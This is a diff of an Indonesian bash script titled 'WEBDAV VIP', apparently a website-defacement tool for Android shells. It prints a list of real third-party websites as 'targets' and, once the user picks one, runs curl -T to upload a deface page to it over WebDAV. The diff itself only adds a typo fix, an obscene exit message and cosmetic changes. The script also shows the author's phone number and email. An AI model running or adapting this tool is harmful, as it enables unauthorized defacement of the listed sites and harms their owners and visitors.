@@ -16,7 +16,7 @@ ku='\033[33;1m' #kuning
 
 clear
 cd /sdcard
-iglet -f pagga WEBDAV VIP | lolcat      
+figlet -f pagga WEBDAV VIP | lolcat      
       echo $bi" contacts: 0895385827909"
       echo $bi" Author: 70LoLcvk" 
       echo $bi" Email: kaa800252@gmail.com"
@@ -38,7 +38,7 @@ ctrl_c() {
 clear
 echo $"CTRL+C Detected, Trying To Exit" | lolcat
 echo ""
-echo $" Byee,see you Saiang " | lolcat
+echo $" Byee,see you Ngentod " | lolcat
 sleep 1 
 exit
 }
@@ -50,13 +50,13 @@ echo $me"["$ku"1"$me"]" $pu"Belum Punya Target";
 echo $me"[============"$pu"=============]"
 echo $me"["$ku"2"$me"]" $pu"Sudah Punya Target";
 echo ""
-echo    "╭─JAWAB TOD:" |lolcat
+echo    "╭─PILIH:" |lolcat
 read -p "╰─#" pil;
 
 case $pil in
 1)echo ""
 echo $pu"List Target:"
-echo $pu"==========================="
+echo $pu"»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»"
 echo $me"
 http://contsol.co.za
 http://colourfactory.co.za
@@ -92,11 +92,11 @@ http://vzcx.idasoft.es/
 "
 
 echo ""
-echo $pu"==========================="
+echo $pu"»»»»»»»»»»»»»»»»»»»»»»»»»»»»»"
 echo -n $i"Masukan Salah Satu Target:" 
 read tg
 echo ""
-echo -n $i"Target $tg !" $cy"Tekan Enter Untuk Tusbol.."
+echo -n $i"Target $tg !" $cy"Tekan Enter Untuk Deface.."
 read trgt
 curl -T /sdcard/$sc $tg
 echo ""
